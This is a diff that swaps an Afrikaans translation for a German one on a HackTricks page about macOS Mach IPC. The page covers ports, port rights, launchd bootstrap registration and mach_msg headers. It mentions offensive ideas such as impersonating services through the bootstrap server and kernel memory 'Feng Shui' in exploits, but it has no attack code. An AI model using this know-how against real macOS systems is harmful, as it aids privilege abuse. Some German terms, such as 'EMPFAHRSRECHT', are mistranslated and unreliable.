@@ -1,93 +1,94 @@
-# macOS IPC - Interproses Kommunikasie
+# macOS IPC - Inter Process Communication
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
 
-## Mach-boodskappe via Havens
+## Mach-Nachrichten über Ports
 
-### Basiese Inligting
+### Grundlegende Informationen
 
-Mach gebruik **take** as die **kleinste eenheid** vir die deel van hulpbronne, en elke taak kan **verskeie drade** bevat. Hierdie **take en drade word 1:1 gekarteer na POSIX-prosesse en drade**.
+Mach verwendet **Tasks** als die **kleinste Einheit** zum Teilen von Ressourcen, und jeder Task kann **mehrere Threads** enthalten. Diese **Tasks und Threads sind 1:1 auf POSIX-Prozesse und -Threads abgebildet**.
 
-Kommunikasie tussen take vind plaas via Mach Interproses Kommunikasie (IPC), wat eenrigting kommunikasiekanaal benut. **Boodskappe word oorgedra tussen hawens**, wat soortgelyk aan **boodskaprye** optree wat deur die kernel bestuur word.
+Die Kommunikation zwischen Tasks erfolgt über Mach Inter-Process Communication (IPC) und nutzt einseitige Kommunikationskanäle. **Nachrichten werden zwischen Ports übertragen**, die eine Art **Nachrichtenwarteschlangen** sind, die vom Kernel verwaltet werden.
 
-'n **Hawe** is die **basiese** element van Mach IPC. Dit kan gebruik word om **boodskappe te stuur en te ontvang**.
+Ein **Port** ist das **grundlegende** Element von Mach IPC. Er kann verwendet werden, um **Nachrichten zu senden und zu empfangen**.
 
-Elke proses het 'n **IPC-tabel**, waarin dit moontlik is om die **mach-hawens van die proses** te vind. Die naam van 'n mach-hawe is eintlik 'n nommer (‘n wyser na die kernel-voorwerp).
+Jeder Prozess hat eine **IPC-Tabelle**, in der die **Mach-Ports des Prozesses** zu finden sind. Der Name eines Mach-Ports ist tatsächlich eine Nummer (ein Zeiger auf das Kernel-Objekt).
 
-'n Proses kan ook 'n hawenaam met sekere regte **na 'n ander taak stuur** en die kernel sal hierdie inskrywing in die **IPC-tabel van die ander taak** laat verskyn.
+Ein Prozess kann auch einen Portnamen mit bestimmten Rechten **an einen anderen Task** senden, und der Kernel wird diesen Eintrag in der **IPC-Tabelle des anderen Tasks** erscheinen lassen.
 
-### Haweregte
+### Portrechte
 
-Haweregte, wat definieer watter operasies 'n taak kan uitvoer, is sleutel tot hierdie kommunikasie. Die moontlike **haweregte** is ([definisies vanaf hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
+Portrechte, die definieren, welche Operationen ein Task ausführen kann, sind entscheidend für diese Kommunikation. Die möglichen **Portrechte** sind ([Definitionen hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
 
-* **Ontvangsreg**, wat die ontvangs van boodskappe wat na die hawe gestuur is, moontlik maak. Mach-hawens is MPSC (meervoudige-vervaardiger, enkelverbruiker) rye, wat beteken dat daar slegs **een ontvangsreg vir elke hawe** in die hele stelsel kan wees (in teenstelling met pype, waar meervoudige prosesse almal lêerbeskrywers na die lees-einde van een pyp kan hê).
-* 'n **Taak met die Ontvangsreg** kan boodskappe ontvang en **Sendregte skep**, wat dit moontlik maak om boodskappe te stuur. Aanvanklik het slegs die **eie taak Ontvangsreg oor sy hawe**.
-* As die eienaar van die Ontvangsreg **sterf** of dit doodmaak, word die **sendreg nutteloos (dood naam)**.
-* **Sendreg**, wat dit moontlik maak om boodskappe na die hawe te stuur.
-* Die Sendreg kan **gekloneer** word sodat 'n taak wat 'n Sendreg besit, die reg kan kloon en dit aan 'n derde taak kan **toeken**.
-* Let daarop dat **haweregte** ook deur Mac-boodskappe **oorgedra** kan word.
-* **Send-eenkeer-reg**, wat dit moontlik maak om een boodskap na die hawe te stuur en dan te verdwyn.
-* Hierdie reg **kan nie** gekloneer word nie, maar dit kan **geskuif** word.
-* **Hawestelreg**, wat 'n _hawe stel_ aandui eerder as 'n enkele hawe. Die ontkoppeling van 'n boodskap van 'n hawe stel ontkoppel 'n boodskap van een van die hawens wat dit bevat. Hawestelle kan gebruik word om gelyktydig na verskeie hawens te luister, soos `select`/`poll`/`epoll`/`kqueue` in Unix.
-* **Dood naam**, wat nie 'n werklike hawe reg is nie, maar bloot 'n plekhouer. Wanneer 'n hawe vernietig word, verander alle bestaande hawe regte na die hawe in dood name.
+* **Empfangsrecht**, das das Empfangen von Nachrichten, die an den Port gesendet werden, erlaubt. Mach-Ports sind MPSC (multiple-producer, single-consumer) Warteschlangen, was bedeutet, dass es im gesamten System **nur ein Empfangsrecht für jeden Port** geben kann (im Gegensatz zu Pipes, bei denen mehrere Prozesse alle Dateideskriptoren zum Leseende einer Pipe halten können).
+* Ein **Task mit dem Empfangsrecht** kann Nachrichten empfangen und **Sende-Rechte erstellen**, die es ihm ermöglichen, Nachrichten zu senden. Ursprünglich hat nur der **eigene Task das Empfangsrecht über seinen Port**.
+* Wenn der Besitzer des Empfangsrechts **stirbt** oder es tötet, wird das **Sende-Recht nutzlos (toter Name).**
+* **Sende-Recht**, das das Senden von Nachrichten an den Port erlaubt.
+* Das Sende-Recht kann **kloniert** werden, sodass ein Task, der ein Sende-Recht besitzt, das Recht klonen und **einem dritten Task gewähren** kann.
+* Beachte, dass **Portrechte** auch durch Mach-Nachrichten **übertragen** werden können.
+* **Send-once-Recht**, das das Senden einer Nachricht an den Port erlaubt und dann verschwindet.
+* Dieses Recht **kann nicht** **kloniert** werden, aber es kann **verschoben** werden.
+* **Port-Set-Recht**, das ein _Port-Set_ anstelle eines einzelnen Ports bezeichnet. Das Entnehmen einer Nachricht aus einem Port-Set entnimmt eine Nachricht aus einem der enthaltenen Ports. Port-Sets können verwendet werden, um gleichzeitig auf mehreren Ports zu hören, ähnlich wie `select`/`poll`/`epoll`/`kqueue` in Unix.
+* **Toter Name**, der kein tatsächliches Portrecht ist, sondern lediglich ein Platzhalter. Wenn ein Port zerstört wird, verwandeln sich alle bestehenden Portrechte für den Port in tote Namen.
 
-**Take kan SEND-regte na ander oordra**, wat hulle in staat stel om boodskappe terug te stuur. **SEND-regte kan ook gekloneer word, sodat 'n taak die reg kan dupliseer en dit aan 'n derde taak kan gee**. Dit, saam met 'n bemiddelende proses wat bekend staan as die **opstartsdiens**, maak effektiewe kommunikasie tussen take moontlik.
+**Tasks können SEND-Rechte an andere übertragen**, wodurch sie in der Lage sind, Nachrichten zurückzusenden. **SEND-Rechte können auch geklont werden, sodass ein Task das Recht duplizieren und einem dritten Task geben kann**. Dies, kombiniert mit einem Zwischenprozess, der als **Bootstrap-Server** bekannt ist, ermöglicht eine effektive Kommunikation zwischen Tasks.
 
-### Lêerhawens
+### Datei-Ports
 
-Lêerhawens maak dit moontlik om lêerbeskrywers in Mac-hawens in te sluit (deur Mach-haweregte te gebruik). Dit is moontlik om 'n `fileport` vanaf 'n gegewe FD te skep deur `fileport_makeport` te gebruik en 'n FD vanaf 'n lêerhawe te skep deur `fileport_makefd` te gebruik.
+Datei-Ports ermöglichen es, Dateideskriptoren in Mach-Ports zu kapseln (unter Verwendung von Mach-Port-Rechten). Es ist möglich, einen `fileport` aus einem gegebenen FD mit `fileport_makeport` zu erstellen und einen FD aus einem fileport mit `fileport_makefd` zu erstellen.
 
-### Die vestiging van 'n kommunikasie
+### Etablierung einer Kommunikation
 
-Soos voorheen genoem, is dit moontlik om regte te stuur deur Mach-boodskappe, maar jy **kan nie 'n reg stuur sonder om reeds 'n reg te hê** om 'n Mach-boodskap te stuur nie. Hoe word die eerste kommunikasie dan gevestig?
+Wie bereits erwähnt, ist es möglich, Rechte mit Mach-Nachrichten zu senden, jedoch **kannst du kein Recht senden, ohne bereits ein Recht zu haben**, um eine Mach-Nachricht zu senden. Wie wird also die erste Kommunikation hergestellt?
 
-Hiervoor is die **opstartsdiens** (**launchd** in Mac) betrokke, aangesien **almal 'n SEND-reg na die opstartsdiens kan kry**, is dit moontlik om dit te vra vir 'n reg om 'n boodskap na 'n ander proses te stuur:
+Dafür ist der **Bootstrap-Server** (**launchd** in macOS) beteiligt, da **jeder ein SEND-Recht zum Bootstrap-Server erhalten kann**, ist es möglich, ihn um ein Recht zu bitten, um eine Nachricht an einen anderen Prozess zu senden:
 
-1. Taak **A** skep 'n **nuwe hawe**, kry die **ONTVANG reg** daaroor.
-2. Taak **A**, as die houer van die ONTVANG reg, **skep 'n SEND reg vir die hawe**.
-3. Taak **A** vestig 'n **verbindings** met die **opstartsdiens**, en **stuur dit die SEND reg** vir die hawe wat dit aan die begin geskep het.
-* Onthou dat enigeen 'n SEND reg na die opstartsdiens kan kry.
-4. Taak A stuur 'n `bootstrap_register` boodskap na die opstartsdiens om die gegewe hawe met 'n naam soos `com.apple.taska` te **assosieer**.
-5. Taak **B** interaksie met die **opstartsdiens** om 'n opstarts **soektog vir die diensnaam** (`bootstrap_lookup`) uit te voer. Sodat die opstartsdiens kan reageer, sal taak B 'n **SEND reg na 'n hawe wat dit voorheen geskep het** binne die soektog-boodskap stuur. As die soektog suksesvol is, **dupliseer die bediener die SEND reg** wat van Taak A ontvang is en **stuur dit na Taak B**.
-* Onthou dat enigeen 'n SEND reg na die opstartsdiens kan kry.
-6. Met hierdie SEND reg is **Taak B** in staat om 'n **boodskap na Taak A** te **stuur**.
-7. Vir 'n tweerigting kommunikasie skep taak **B** gewoonlik 'n nuwe hawe met 'n **ONTVANG** reg en 'n **SEND** reg, en gee die **SEND reg aan Taak A** sodat dit boodskappe aan TAASK B kan stuur (tweerigting kommunikasie).
+1. Task **A** erstellt einen **neuen Port** und erhält das **EMPFAHRSRECHT** dafür.
+2. Task **A**, als Inhaber des EMPFAHRSRECHTS, **generiert ein SEND-Recht für den Port**.
+3. Task **A** stellt eine **Verbindung** mit dem **Bootstrap-Server** her und **sendet ihm das SEND-Recht** für den Port, den es zu Beginn generiert hat.
+* Denk daran, dass jeder ein SEND-Recht zum Bootstrap-Server erhalten kann.
+4. Task A sendet eine `bootstrap_register`-Nachricht an den Bootstrap-Server, um **den gegebenen Port mit einem Namen** wie `com.apple.taska` zu verknüpfen.
+5. Task **B** interagiert mit dem **Bootstrap-Server**, um eine Bootstrap-**Suche nach dem Dienstnamen** (`bootstrap_lookup`) durchzuführen. Damit der Bootstrap-Server antworten kann, sendet Task B ihm ein **SEND-Recht zu einem Port, den es zuvor erstellt hat**, innerhalb der Suchnachricht. Wenn die Suche erfolgreich ist, **dupliziert der Server das SEND-Recht**, das von Task A empfangen wurde, und **überträgt es an Task B**.
+* Denk daran, dass jeder ein SEND-Recht zum Bootstrap-Server erhalten kann.
+6. Mit diesem SEND-Recht ist **Task B** in der Lage, eine **Nachricht** **an Task A** zu **senden**.
+7. Für eine bidirektionale Kommunikation generiert normalerweise Task **B** einen neuen Port mit einem **EMPFAHRSRECHT** und einem **SEND-RECHT** und gibt das **SEND-Recht an Task A**, damit es Nachrichten an TASK B senden kann (bidirektionale Kommunikation).
 
-Die opstartsdiens **kan nie die diensnaam autentiseer** wat deur 'n taak beweer word nie. Dit beteken 'n **taak** kan potensieel **enige stelseltaak naboots**, soos valse **goedkeuring van 'n outorisasiediensnaam** en dan elke versoek goedkeur.
+Der Bootstrap-Server **kann den Dienstnamen, der von einem Task beansprucht wird, nicht authentifizieren**. Das bedeutet, dass ein **Task** potenziell **jede Systemaufgabe impersonieren** könnte, indem er fälschlicherweise **einen Autorisierungsdienstnamen beansprucht** und dann jede Anfrage genehmigt.
 
-Dan stoor Apple die **name van stelselverskafde dienste** in veilige konfigurasie lêers, geleë in **SIP-beskermde** gids: `/System/Library/LaunchDaemons` en `/System/Library/LaunchAgents`. Saam met elke diensnaam word ook die **geassosieerde binêre lêer gestoor**. Die opstartsdiens sal 'n **ONTVANG reg vir elkeen van hierdie diensname** skep en behou.
+Dann speichert Apple die **Namen der systemeigenen Dienste** in sicheren Konfigurationsdateien, die sich in **SIP-geschützten** Verzeichnissen befinden: `/System/Library/LaunchDaemons` und `/System/Library/LaunchAgents`. Neben jedem Dienstnamen wird auch die **assoziierte Binärdatei gespeichert**. Der Bootstrap-Server wird ein **EMPFAHRSRECHT für jeden dieser Dienstnamen** erstellen und halten.
 
-Vir hierdie voorgedefinieerde dienste, verskil die **soektogproses effens**. Wanneer 'n diensnaam opgesoek word, begin launchd die diens dinamies. Die nuwe werkstroom is as volg:
+Für diese vordefinierten Dienste unterscheidet sich der **Suchprozess leicht**. Wenn ein Dienstname gesucht wird, startet launchd den Dienst dynamisch. Der neue Workflow ist wie folgt:
 
-* Taak **B** inisieer 'n opstarts **soektog** vir 'n diensnaam.
-* **launchd** kontroleer of die taak loop en as dit nie is nie, **begin** dit.
-* Taak **A** (die diens) voer 'n **opstarts inligting** uit (`bootstrap_check_in()`). Hier skep die **opstarts** diens 'n SEND reg, behou dit, en **oorhandig die ONTVANG reg aan Taak A**.
-* launchd dupliseer die **SEND reg en stuur dit na Taak B**.
-* Taak **B** skep 'n nuwe hawe met 'n **ONTVANG** reg en 'n **SEND** reg, en gee die **SEND reg aan Taak A** (die diens) sodat dit boodskappe aan TAASK B kan stuur (tweerigting kommunikasie).
+* Task **B** initiiert eine Bootstrap-**Suche** nach einem Dienstnamen.
+* **launchd** überprüft, ob der Task läuft, und wenn nicht, **startet** er ihn.
+* Task **A** (der Dienst) führt eine **Bootstrap-Check-in** (`bootstrap_check_in()`) durch. Hier erstellt der **Bootstrap-**Server ein SEND-Recht, behält es und **überträgt das EMPFAHRSRECHT an Task A**.
+* launchd dupliziert das **SEND-Recht und sendet es an Task B**.
+* Task **B** generiert einen neuen Port mit einem **EMPFAHRSRECHT** und einem **SEND-RECHT** und gibt das **SEND-Recht an Task A** (den Dienst) weiter, damit er Nachrichten an TASK B senden kann (bidirektionale Kommunikation).
 
-Hierdie proses geld egter slegs vir voorgedefinieerde stelseltake. Nie-stelsel take werk steeds soos aanvanklik beskryf, wat potensieel die moontlikheid vir nabootsing kan toelaat.
+Dieser Prozess gilt jedoch nur für vordefinierte Systemaufgaben. Nicht-Systemaufgaben funktionieren weiterhin wie ursprünglich beschrieben, was potenziell eine Impersonation ermöglichen könnte.
 
 {% hint style="danger" %}
-Daarom behoort launchd nooit te bots nie, anders sal die hele stelsel bots.
+Daher sollte launchd niemals abstürzen, sonst stürzt das gesamte System ab.
 {% endhint %}
-### 'n Mach-boodskap
 
-[Vind meer inligting hier](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+### Eine Mach-Nachricht
 
-Die `mach_msg`-funksie, essensieel 'n stelseloproep, word gebruik om Mach-boodskappe te stuur en te ontvang. Die funksie vereis dat die boodskap as die aanvanklike argument gestuur word. Hierdie boodskap moet begin met 'n `mach_msg_header_t`-struktuur, gevolg deur die werklike boodskapinhoud. Die struktuur word soos volg gedefinieer:
+[Hier mehr Informationen finden](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+
+Die Funktion `mach_msg`, die im Wesentlichen ein Systemaufruf ist, wird verwendet, um Mach-Nachrichten zu senden und zu empfangen. Die Funktion erfordert, dass die zu sendende Nachricht als erstes Argument übergeben wird. Diese Nachricht muss mit einer `mach_msg_header_t`-Struktur beginnen, gefolgt vom eigentlichen Nachrichteninhalt. Die Struktur ist wie folgt definiert:
 ```c
 typedef struct {
 mach_msg_bits_t               msgh_bits;
@@ -98,17 +99,17 @@ mach_port_name_t              msgh_voucher_port;
 mach_msg_id_t                 msgh_id;
 } mach_msg_header_t;
 ```
-Prosesse wat 'n _**ontvangsreg**_ besit, kan boodskappe op 'n Mach-poort ontvang. Omgekeerd word aan die **senders** 'n _**stuur**_ of 'n _**eenmalige stuur reg**_ toegeken. Die eenmalige stuur reg is uitsluitlik vir die stuur van 'n enkele boodskap, waarna dit ongeldig word.
+Prozesse, die über ein _**receive right**_ verfügen, können Nachrichten über einen Mach-Port empfangen. Umgekehrt wird den **Sendenden** ein _**send**_ oder ein _**send-once right**_ gewährt. Das send-once right ist ausschließlich zum Senden einer einzelnen Nachricht gedacht, nach der es ungültig wird.
 
-Die aanvanklike veld **`msgh_bits`** is 'n bietjiekaart:
+Das anfängliche Feld **`msgh_bits`** ist ein Bitmap:
 
-- Die eerste bit (mees betekenisvolle) word gebruik om aan te dui dat 'n boodskap kompleks is (meer hieroor hieronder)
-- Die 3de en 4de word deur die kernel gebruik
-- Die **5 minst betekenisvolle bits van die 2de byte** kan gebruik word vir **voucher**: 'n ander tipe poort om sleutel/waarde kombinasies te stuur.
-- Die **5 minst betekenisvolle bits van die 3de byte** kan gebruik word vir **plaaslike poort**
-- Die **5 minst betekenisvolle bits van die 4de byte** kan gebruik word vir **afgeleë poort**
+* Das erste Bit (am signifikantesten) wird verwendet, um anzuzeigen, dass eine Nachricht komplex ist (mehr dazu unten)
+* Das 3. und 4. Bit werden vom Kernel verwendet
+* Die **5 am wenigsten signifikanten Bits des 2. Bytes** können für **voucher** verwendet werden: ein anderer Typ von Port, um Schlüssel/Wert-Kombinationen zu senden.
+* Die **5 am wenigsten signifikanten Bits des 3. Bytes** können für **local port** verwendet werden
+* Die **5 am wenigsten signifikanten Bits des 4. Bytes** können für **remote port** verwendet werden
 
-Die tipes wat in die voucher, plaaslike en afgeleë poorte gespesifiseer kan word is (vanaf [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
+Die Typen, die im Voucher, lokalen und entfernten Ports angegeben werden können, sind (aus [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
 ```c
 #define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
 #define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
@@ -121,34 +122,34 @@ Die tipes wat in die voucher, plaaslike en afgeleë poorte gespesifiseer kan wor
 #define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
 #define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
 ```
-Byvoorbeeld, `MACH_MSG_TYPE_MAKE_SEND_ONCE` kan gebruik word om aan te dui dat 'n **stuur-eenmaal-reg** afgelei en oorgedra moet word vir hierdie poort. Dit kan ook gespesifiseer word as `MACH_PORT_NULL` om te voorkom dat die ontvanger kan antwoord.
+For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` kann verwendet werden, um **anzuzeigen**, dass ein **send-once** **Recht** für diesen Port abgeleitet und übertragen werden sollte. Es kann auch `MACH_PORT_NULL` angegeben werden, um zu verhindern, dass der Empfänger antworten kann.
 
-Om 'n maklike **tweerigting kommunikasie** te bereik, kan 'n proses 'n **mach-poort** spesifiseer in die mach **boodskap kop** genoem die _antwoordpoort_ (**`msgh_local_port`**) waar die **ontvanger** van die boodskap 'n antwoord kan stuur op hierdie boodskap.
+Um eine einfache **zweiseitige Kommunikation** zu erreichen, kann ein Prozess einen **mach port** im mach **Nachrichtenkopf** angeben, der als _Antwortport_ (**`msgh_local_port`**) bezeichnet wird, wo der **Empfänger** der Nachricht eine **Antwort** auf diese Nachricht senden kann.
 
 {% hint style="success" %}
-Let daarop dat hierdie soort tweerigting kommunikasie gebruik word in XPC-boodskappe wat 'n antwoord verwag (`xpc_connection_send_message_with_reply` en `xpc_connection_send_message_with_reply_sync`). Maar **gewoonlik word verskillende poorte geskep** soos voorheen verduidelik om die tweerigting kommunikasie te skep.
+Beachten Sie, dass diese Art der zweiseitigen Kommunikation in XPC-Nachrichten verwendet wird, die eine Antwort erwarten (`xpc_connection_send_message_with_reply` und `xpc_connection_send_message_with_reply_sync`). Aber **normalerweise werden unterschiedliche Ports erstellt**, wie zuvor erklärt, um die zweiseitige Kommunikation zu schaffen.
 {% endhint %}
 
-Die ander velde van die boodskap kop is:
+Die anderen Felder des Nachrichtenkopfes sind:
 
-- `msgh_size`: die grootte van die hele pakkie.
-- `msgh_remote_port`: die poort waarop hierdie boodskap gestuur word.
-- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html).
-- `msgh_id`: die ID van hierdie boodskap, wat deur die ontvanger geïnterpreteer word.
+* `msgh_size`: die Größe des gesamten Pakets.
+* `msgh_remote_port`: der Port, über den diese Nachricht gesendet wird.
+* `msgh_voucher_port`: [mach Gutscheine](https://robert.sesek.com/2023/6/mach\_vouchers.html).
+* `msgh_id`: die ID dieser Nachricht, die vom Empfänger interpretiert wird.
 
 {% hint style="danger" %}
-Let daarop dat **mach-boodskappe oor 'n `mach-poort` gestuur word**, wat 'n **enkele ontvanger**, **veelvuldige stuurder** kommunikasiekanaal is wat in die mach-kernel ingebou is. **Meer as een proses** kan **boodskappe stuur** na 'n mach-poort, maar op enige punt kan slegs **'n enkele proses daarvan lees**.
+Beachten Sie, dass **mach-Nachrichten über einen `mach port` gesendet werden**, der ein **einzelner Empfänger**, **mehrere Sender** Kommunikationskanal ist, der in den mach-Kernel integriert ist. **Mehrere Prozesse** können **Nachrichten** an einen mach-Port senden, aber zu jedem Zeitpunkt kann nur **ein einzelner Prozess** von ihm lesen.
 {% endhint %}
 
-Boodskappe word dan gevorm deur die **`mach_msg_header_t`** kop gevolg deur die **liggaam** en deur die **trailer** (indien enige) en dit kan toestemming verleen om daarop te antwoord. In hierdie gevalle hoef die kernel net die boodskap van die een taak na die ander oor te dra.
+Nachrichten werden dann durch den **`mach_msg_header_t`** Kopf gebildet, gefolgt vom **Inhalt** und vom **Trailer** (falls vorhanden), und es kann die Erlaubnis erteilt werden, darauf zu antworten. In diesen Fällen muss der Kernel die Nachricht nur von einer Aufgabe zur anderen weiterleiten.
 
-'n **Trailer** is **inligting wat deur die kernel by die boodskap gevoeg word** (kan nie deur die gebruiker ingestel word nie) wat aangevra kan word in die boodskap ontvangs met die vlae `MACH_RCV_TRAILER_<trailer_opt>` (daar is verskillende inligting wat aangevra kan word).
+Ein **Trailer** ist **Informationen, die vom Kernel zur Nachricht hinzugefügt werden** (kann nicht vom Benutzer festgelegt werden), die beim Empfang der Nachricht mit den Flags `MACH_RCV_TRAILER_<trailer_opt>` angefordert werden können (es gibt unterschiedliche Informationen, die angefordert werden können).
 
-#### Complekse Boodskappe
+#### Komplexe Nachrichten
 
-Daar is egter ander meer **komplekse** boodskappe, soos dié wat addisionele poortregte deurgee of geheue deel, waar die kernel ook hierdie voorwerpe na die ontvanger moet stuur. In hierdie gevalle is die mees beduidende bit van die kop `msgh_bits` ingestel.
+Es gibt jedoch auch andere, **komplexere** Nachrichten, wie die, die zusätzliche Portrechte übergeben oder Speicher teilen, bei denen der Kernel auch diese Objekte an den Empfänger senden muss. In diesen Fällen wird das signifikanteste Bit des Kopfes `msgh_bits` gesetzt.
 
-Die moontlike beskrywers om deur te gee is gedefinieer in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
+Die möglichen Deskriptoren, die übergeben werden können, sind in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) definiert:
 ```c
 #define MACH_MSG_PORT_DESCRIPTOR                0
 #define MACH_MSG_OOL_DESCRIPTOR                 1
@@ -165,63 +166,63 @@ unsigned int                  pad3 : 24;
 mach_msg_descriptor_type_t    type : 8;
 } mach_msg_type_descriptor_t;
 ```
-In 32bits, al die beskrywers is 12B en die beskrywerstipe is in die 11de een. In 64 bits, varieer die groottes.
+In 32-Bit sind alle Deskriptoren 12B und der Deskriptor-Typ befindet sich im 11. Deskriptor. In 64-Bit variieren die Größen.
 
 {% hint style="danger" %}
-Die kernel sal die beskrywers van die een taak na die ander kopieer, maar eerste **'n kopie in die kernel-geheue skep**. Hierdie tegniek, bekend as "Feng Shui", is misbruik in verskeie aanvalle om die **kernel data in sy geheue te laat kopieer** sodat 'n proses beskrywers na homself kan stuur. Dan kan die proses die boodskappe ontvang (die kernel sal hulle vrymaak).
+Der Kernel wird die Deskriptoren von einer Aufgabe zur anderen kopieren, aber zuerst **eine Kopie im Kernel-Speicher erstellen**. Diese Technik, bekannt als "Feng Shui", wurde in mehreren Exploits missbraucht, um den **Kernel dazu zu bringen, Daten in seinem Speicher zu kopieren**, wodurch ein Prozess Deskriptoren an sich selbst sendet. Dann kann der Prozess die Nachrichten empfangen (der Kernel wird sie freigeben).
 
-Dit is ook moontlik om **poortregte na 'n kwesbare proses te stuur**, en die poortregte sal net in die proses verskyn (selfs al hanteer hy dit nie).
+Es ist auch möglich, **Port-Rechte an einen verwundbaren Prozess zu senden**, und die Port-Rechte werden einfach im Prozess erscheinen (auch wenn er sie nicht verwaltet).
 {% endhint %}
 
 ### Mac Ports APIs
 
-Let daarop dat poorte aan die taaknaamruimte gekoppel is, sodat om 'n poort te skep of te soek, die taaknaamruimte ook ondersoek word (meer in `mach/mach_port.h`):
+Beachten Sie, dass Ports mit dem Aufgabennamespace verbunden sind, sodass zum Erstellen oder Suchen eines Ports auch der Aufgabennamespace abgefragt wird (mehr in `mach/mach_port.h`):
 
-* **`mach_port_allocate` | `mach_port_construct`**: **Skep** 'n poort.
-* `mach_port_allocate` kan ook 'n **poortstel** skep: ontvangsreg oor 'n groep poorte. Wanneer 'n boodskap ontvang word, word die poort aangedui waarvandaan dit afkomstig is.
-* `mach_port_allocate_name`: Verander die naam van die poort (standaard 32-bis integer)
-* `mach_port_names`: Kry poortname van 'n teiken
-* `mach_port_type`: Kry regte van 'n taak oor 'n naam
-* `mach_port_rename`: Hernoem 'n poort (soos dup2 vir FD's)
-* `mach_port_allocate`: Allokeer 'n nuwe ONTVANG, POORT_STEL of DOOD_NAAM
-* `mach_port_insert_right`: Skep 'n nuwe reg in 'n poort waar jy ONTVANG het
+* **`mach_port_allocate` | `mach_port_construct`**: **Erstellen** Sie einen Port.
+* `mach_port_allocate` kann auch ein **Port-Set** erstellen: Empfangsrecht über eine Gruppe von Ports. Jedes Mal, wenn eine Nachricht empfangen wird, wird der Port angegeben, von dem sie stammt.
+* `mach_port_allocate_name`: Ändern Sie den Namen des Ports (standardmäßig 32-Bit-Ganzzahl)
+* `mach_port_names`: Holen Sie sich Portnamen von einem Ziel
+* `mach_port_type`: Holen Sie sich die Rechte einer Aufgabe über einen Namen
+* `mach_port_rename`: Benennen Sie einen Port um (wie dup2 für FDs)
+* `mach_port_allocate`: Weisen Sie einen neuen RECEIVE, PORT_SET oder DEAD_NAME zu
+* `mach_port_insert_right`: Erstellen Sie ein neues Recht in einem Port, in dem Sie RECEIVE haben
 * `mach_port_...`
-* **`mach_msg`** | **`mach_msg_overwrite`**: Funksies wat gebruik word om **mach-boodskappe te stuur en te ontvang**. Die oorskrywingsweergawe maak dit moontlik om 'n ander buffer vir boodskaponvangst te spesifiseer (die ander weergawe sal dit net hergebruik).
+* **`mach_msg`** | **`mach_msg_overwrite`**: Funktionen, die verwendet werden, um **mach-Nachrichten zu senden und zu empfangen**. Die Überschreibungsversion ermöglicht es, einen anderen Puffer für den Nachrichteneingang anzugeben (die andere Version wird ihn einfach wiederverwenden).
 
 ### Debug mach\_msg
 
-Aangesien die funksies **`mach_msg`** en **`mach_msg_overwrite`** diegene is wat gebruik word om boodskappe te stuur en te ontvang, sal dit moontlik wees om 'n breekpunt daarop te stel om die gestuurde en ontvangsboodskappe te ondersoek.
+Da die Funktionen **`mach_msg`** und **`mach_msg_overwrite`** die sind, die verwendet werden, um Nachrichten zu senden und zu empfangen, würde das Setzen eines Haltepunkts auf ihnen ermöglichen, die gesendeten und empfangenen Nachrichten zu inspizieren.
 
-Begin byvoorbeeld met die foutopsporing van enige toepassing wat jy kan foutopspoor aangesien dit **`libSystem.B` sal laai wat hierdie funksie sal gebruik**.
+Zum Beispiel starten Sie das Debuggen einer beliebigen Anwendung, die Sie debuggen können, da sie **`libSystem.B` laden wird, die diese Funktion verwenden wird**.
 
